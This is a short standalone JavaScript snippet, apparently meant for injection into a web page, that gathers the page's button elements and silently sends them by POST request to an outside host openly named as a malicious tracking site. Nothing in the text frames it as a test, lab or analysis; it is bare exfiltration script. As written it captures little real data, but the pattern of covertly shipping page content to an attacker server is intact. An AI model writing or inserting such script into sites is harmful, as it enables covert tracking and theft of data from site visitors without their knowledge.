(function () {
  const button = document.getElementsByTagName("button");
  const link = "https://malicious-site-awx4.onrender.com/track";

  fetch(link, {
    method: "POST",
    body: JSON.stringify(button),
    headers: {
      "Content-Type": "application/json",
    },
  });
})();
